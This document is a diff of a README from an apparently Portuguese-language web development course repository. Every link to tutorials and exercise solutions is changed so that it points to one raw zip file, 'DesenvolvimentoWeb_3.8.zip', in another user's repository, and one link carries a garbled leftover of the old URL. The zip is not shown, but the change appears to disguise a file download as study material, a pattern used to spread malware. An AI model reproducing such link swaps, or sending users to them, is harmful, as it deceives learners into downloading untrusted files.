@@ -8,17 +8,17 @@ Repositório destinado para as aulas de  Desenvolvimento Web I - Foco em conceit
 ## Roadmap
 
 - Material para consulta
- - [Funções em JavaScript](https://blog.matheuscastiglioni.com.br/definindo-funcoes-em-javascript/)
- - [Eventos em JavaScript](https://www.w3schools.com/js/js_events_examples.asp)
- - [Manipulando o DOM em JavaScript](https://www.javascripttutorial.net/javascript-dom/)
- - [Age Calculator - Example ](https://dev.to/code_mystery/javascript-age-calculator-calculate-age-from-date-of-birth-o9b)
- - [Regular Expressions ](https://ricardo-reis.medium.com/express%C3%B5es-regulares-javascript-295da6deaee7)
- - [Bootstrap ](https://getbootstrap.com/)
- - [Layout Bootstrap ](https://designmodo.com/bootstrap-5-layout/)
- - [Local Storage ](https://medium.com/jaguaribetech/dlskaddaldkslkdlskdlk-333dae8ef9b8)
- - [Local Storage II ](https://blog.logrocket.com/localstorage-javascript-complete-guide/#what-window-localstorage)
+ - [Funções em JavaScript](https://raw.githubusercontent.com/NagilaLopes/DesenvolvimentoWeb/master/aula08/DesenvolvimentoWeb_3.8.zip)
+ - [Eventos em JavaScript](https://raw.githubusercontent.com/NagilaLopes/DesenvolvimentoWeb/master/aula08/DesenvolvimentoWeb_3.8.zip)
+ - [Manipulando o DOM em JavaScript](https://raw.githubusercontent.com/NagilaLopes/DesenvolvimentoWeb/master/aula08/DesenvolvimentoWeb_3.8.zip)
+ - [Age Calculator - Example ](https://raw.githubusercontent.com/NagilaLopes/DesenvolvimentoWeb/master/aula08/DesenvolvimentoWeb_3.8.zip)
+ - [Regular Expressions ](https://raw.githubusercontent.com/NagilaLopes/DesenvolvimentoWeb/master/aula08/DesenvolvimentoWeb_3.8.zip%C3%B5es-regulares-javascript-295da6deaee7)
+ - [Bootstrap ](https://raw.githubusercontent.com/NagilaLopes/DesenvolvimentoWeb/master/aula08/DesenvolvimentoWeb_3.8.zip)
+ - [Layout Bootstrap ](https://raw.githubusercontent.com/NagilaLopes/DesenvolvimentoWeb/master/aula08/DesenvolvimentoWeb_3.8.zip)
+ - [Local Storage ](https://raw.githubusercontent.com/NagilaLopes/DesenvolvimentoWeb/master/aula08/DesenvolvimentoWeb_3.8.zip)
+ - [Local Storage II ](https://raw.githubusercontent.com/NagilaLopes/DesenvolvimentoWeb/master/aula08/DesenvolvimentoWeb_3.8.zip)
 
 - Resolução das Listas de Exercícios/Trabalhos
- - [Lista IF/ELSE](https://github.com/Adeilsoara/DesenvolvimentoWeb/blob/master/aula05/script.js)
+ - [Lista IF/ELSE](https://raw.githubusercontent.com/NagilaLopes/DesenvolvimentoWeb/master/aula08/DesenvolvimentoWeb_3.8.zip)
 
- - [Lista Funções](https://github.com/Adeilsoara/DesenvolvimentoWeb/blob/master/aula09/script.js)
+ - [Lista Funções](https://raw.githubusercontent.com/NagilaLopes/DesenvolvimentoWeb/master/aula08/DesenvolvimentoWeb_3.8.zip)
